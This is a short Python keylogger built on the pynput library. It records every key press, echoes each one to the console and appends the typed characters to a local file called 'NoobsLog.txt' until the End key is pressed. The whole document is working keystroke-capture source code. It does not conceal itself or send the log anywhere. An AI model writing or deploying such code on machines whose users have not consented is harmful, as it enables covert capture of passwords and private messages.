import pynput
from pynput.keyboard import Key, Listener
word_counts = 0
keys = []
def on_press(key): #defining actions after key press on keyboard
    global word_counts, keys
    keys.append(key)
    word_counts += 1
    print(f'{key}')
    if word_counts >= 5:
        word_counts = 0
        write_file(keys)
        keys = []

def write_file(key_arr): #writting the key strokes in a file
    with open("NoobsLog.txt", "a") as f:
        for key in key_arr:
            ke = str(key).replace("'", "")
            if ke.find("space") > 0:
                f.write('\n')
            # Finding other Keys
            if ke.find("Key") == -1:
                f.write(ke)
def on_release(key): #to stop the program, define action here
 if key == Key.end:
  return False
with Listener(on_press=on_press, on_release=on_release) as listner:
 listner.join()